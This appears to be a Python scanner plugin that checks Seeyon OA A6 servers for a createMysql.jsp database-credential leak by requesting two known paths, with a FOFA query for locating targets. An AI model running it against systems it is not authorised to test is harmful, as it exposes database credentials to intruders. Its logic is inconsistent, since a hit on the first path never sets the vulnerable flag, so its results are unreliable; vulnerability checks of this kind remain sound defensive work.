#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = 'https://peiqi.wgpsec.org/wiki/oa/致远OA/致远OA A6 createMysql.jsp 数据库敏感信息泄露.html#漏洞复现',
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "致远OA A6 createMysql.jsp数据库敏感信息泄露漏洞"
  ret['level'] = "high"
  ret['FOFA'] = 'title="致远A8+协同管理软件.A6"'
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  targets = ["/yyoa/createMysql.jsp","/yyoa/ext/createMysql.jsp"]
  url1 = url + targets[0]
  url2 = url + targets[1]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "localhost" in res.text and "root" in res.text and 'debugger' in res.text:
      ret['url'] = url1
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and "localhost" in resp.text and "root" in resp.text and 'debugger' in resp.text:
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret